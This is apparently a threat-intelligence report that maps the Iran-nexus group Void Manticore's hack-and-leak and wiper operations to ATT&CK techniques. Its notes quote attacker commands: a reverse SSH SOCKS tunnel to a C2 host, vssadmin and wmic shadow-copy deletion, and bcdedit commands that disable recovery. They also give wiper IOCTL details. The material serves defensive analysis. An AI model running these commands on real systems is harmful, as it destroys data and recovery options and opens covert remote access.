# Void Manticore — ATT&CK Technique Mapping

> Attribution: Iran-nexus — high confidence.
> Enriched from public threat reporting (per-technique sources in intel/cti-pipeline.json).

Total techniques mapped: **21** across **9** tactics.

## Resource Development

| Technique | ID | Notes |
|---|---|---|
| Establish Accounts: Social Media Accounts | [T1585.001](https://attack.mitre.org/techniques/T1585/001/) | Void Manticore built and operated hack-and-leak influence personas — 'Karma'/'KarMa' (Telegram channel + Karmabelow80 website, posing as an 'Anti-Zionist Jewish Hackers' group) for Israel and 'Homeland Justice' for Albania — to leak stolen data and amplify the psychological impact of its destructive attacks. |
| Acquire Infrastructure | [T1583](https://attack.mitre.org/techniques/T1583/) | Void Manticore stood up external C2 servers (reached over SSH on port 443) and leak websites (e.g. Karmabelow80). Following the handoff, a distinct set of attacker IPs began accessing the victim network, separate from Scarred Manticore's infrastructure. |

## Initial Access

| Technique | ID | Notes |
|---|---|---|
| Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190/) | Initial access to victim networks was obtained via exploitation of an internet-facing application (CVE-2019-0604, Microsoft SharePoint) — performed by the espionage partner Scarred Manticore (Storm-0861) and then handed off to Void Manticore. Void Manticore's own access was established through an internet-facing web server on which it planted web shells. |
| Valid Accounts: Domain Accounts | [T1078.002](https://attack.mitre.org/techniques/T1078/002/) | One of Void Manticore's first observed actions was the use of a Domain Admin account handed to it during the transfer. The bespoke binary do.exe carried hard-coded Domain Admin credentials and validated them before deploying a further web shell — strong evidence the domain access was supplied by the partner rather than independently obtained. |

## Execution

| Technique | ID | Notes |
|---|---|---|
| Command and Scripting Interpreter: Windows Command Shell | [T1059.003](https://attack.mitre.org/techniques/T1059/003/) | Void Manticore executed follow-on commands through Karma Shell via cmd.exe /c, including reconnaissance (net user /domain, ping), unpacking tooling with WinRAR, and launching payloads (e.g. cmd.exe /c C:\Programdata\do.exe). |

## Persistence

| Technique | ID | Notes |
|---|---|---|
| Server Software Component: Web Shell | [T1505.003](https://attack.mitre.org/techniques/T1505/003/) | Void Manticore deployed web shells on internet-facing servers for access and command relay: a homebrew 'Karma Shell' (masquerading as an HTTP error page; capable of listing directories, creating processes, uploading files, and start/stop/list of services) and the publicly available reGeorge tunneling web shell, copied into the web directory by do.exe after Domain Admin validation. |

## Defense Evasion

| Technique | ID | Notes |
|---|---|---|
| Deobfuscate/Decode Files or Information | [T1140](https://attack.mitre.org/techniques/T1140/) | Karma Shell decodes attacker-supplied parameters at runtime using base64 followed by a one-byte XOR (key 0x17). The BiBi wiper stores all of its command strings reversed and un-reverses them at runtime to hinder static analysis. |
| Obfuscated Files or Information | [T1027](https://attack.mitre.org/techniques/T1027/) | The BiBi wiper stores its embedded command strings (vssadmin/wmic/bcdedit invocations) in reverse-byte form inside the binary so that plain-string scanning does not surface the destructive commands. |
| Masquerading | [T1036](https://attack.mitre.org/techniques/T1036/) | The homebrew Karma Shell masquerades as a benign HTTP error page (via its page title and content) to avoid drawing attention on the compromised web server. |
| Subvert Trust Controls: Code Signing | [T1553.002](https://attack.mitre.org/techniques/T1553/002/) | The Albania partition wiper internally named LowEraser (No-Justice Wiper) was digitally signed by 'Attest Inspection Limited', and its file icon matched that company's website logo — abusing a code-signing identity to appear legitimate. |

## Discovery

| Technique | ID | Notes |
|---|---|---|
| Account Discovery: Domain Accounts | [T1087.002](https://attack.mitre.org/techniques/T1087/002/) | Void Manticore enumerated domain accounts via Karma Shell using 'net user <username> /domain' and collected broader Active Directory information using SysInternals AD Explorer on compromised hosts. |
| System Network Configuration Discovery | [T1016](https://attack.mitre.org/techniques/T1016/) | The attacker ran connectivity checks through Karma Shell, using ping.exe against an external resolver (4.2.2.4) and microsoft.com to confirm the compromised host's outbound network reachability and environment before proceeding. |

## Lateral Movement

| Technique | ID | Notes |
|---|---|---|
| Remote Services: Remote Desktop Protocol | [T1021.001](https://attack.mitre.org/techniques/T1021/001/) | Void Manticore performed hands-on-keyboard lateral movement primarily via RDP after deploying the reGeorge tunneling web shell, using the handed-off Domain Admin access to reach additional hosts before deploying wipers. |

## Command and Control

| Technique | ID | Notes |
|---|---|---|
| Ingress Tool Transfer | [T1105](https://attack.mitre.org/techniques/T1105/) | The attacker used Karma Shell's upload_file function to stage tooling on the compromised server (do.exe, do.zip, an additional reGeorge web shell), then unpacked do.zip with WinRAR and executed do.exe. |
| Proxy: Internal Proxy | [T1090.001](https://attack.mitre.org/techniques/T1090/001/) | Void Manticore deployed the reGeorge web shell to create a SOCKS proxy/tunnel into the internal network, routing follow-on operator traffic (including RDP) through the compromised internet-facing server. |
| Protocol Tunneling | [T1572](https://attack.mitre.org/techniques/T1572/) | On some hosts Void Manticore established a C2 channel with an OpenSSH client configured as a reverse SOCKS proxy over port 443, e.g. 'ssh root@<C2> -R 1090 -p 443 -o ServerAliveInterval=60' and '-R 1080', tunneling operator access through an HTTPS-looking port. |

## Impact

| Technique | ID | Notes |
|---|---|---|
| Data Destruction | [T1485](https://attack.mitre.org/techniques/T1485/) | Void Manticore's defining objective. Beyond automated wipers, it performed manual data destruction using seemingly legitimate utilities: deleting files via Windows File Explorer, secure-wiping with SysInternals SDelete, and using the Windows Format utility ('Quick Format' to corrupt the partition and 'Full' format to destroy partition and content). Leaked data amplifies the destruction. |
| Disk Wipe: Disk Content Wipe | [T1561.001](https://attack.mitre.org/techniques/T1561/001/) | Cl Wiper (cl.exe) installs the ElRawDisk driver rwdsk.sys as a service (RawDisk3) and issues IOCTLs 0x227F80 / 0x22BF84 to overwrite the physical drive contents with a predefined buffer (filled with '0'). The BiBi wipers overwrite target file contents with buffers of random data across multiple threads (BiBi-Linux avoids .out/.so; BiBi-Windows avoids .exe/.dll/.sys) and rename files with the '.BiBi<1-5>' / '.bb<random>' extension. |
| Disk Wipe: Disk Structure Wipe | [T1561.002](https://attack.mitre.org/techniques/T1561/002/) | Void Manticore's partition wipers (JustMBR in Israel; LowEraser/No-Justice and Pinky in Albania) iterate over physical disks and send IOCTL_DISK_DELETE_DRIVE_LAYOUT (0x7C100), removing MBR signatures or wiping both the primary GPT header (sector 1) and the backup GPT table (last sector), causing a BSOD and boot failure. Later BiBi wiper variants (Feb 2024) incorporated the same partition-wiping code. |
| Inhibit System Recovery | [T1490](https://attack.mitre.org/techniques/T1490/) | The BiBi-Windows-Wiper deletes shadow copies with 'vssadmin delete shadows /quIet /all' and 'wmic shadowcopy delete', and disables Windows automatic recovery with 'bcdedit /set {default} bootstatuspolicy ignoreallfailures' followed by 'bcdedit /set {default} recoveryenabled no' (command strings stored reversed in the binary). |
| System Shutdown/Reboot | [T1529](https://attack.mitre.org/techniques/T1529/) | After the partition table is corrupted, the affected system crashes with a blue screen of death and fails to boot on the subsequent reboot due to the destroyed partition layout — the terminal step that renders endpoints inoperable. |
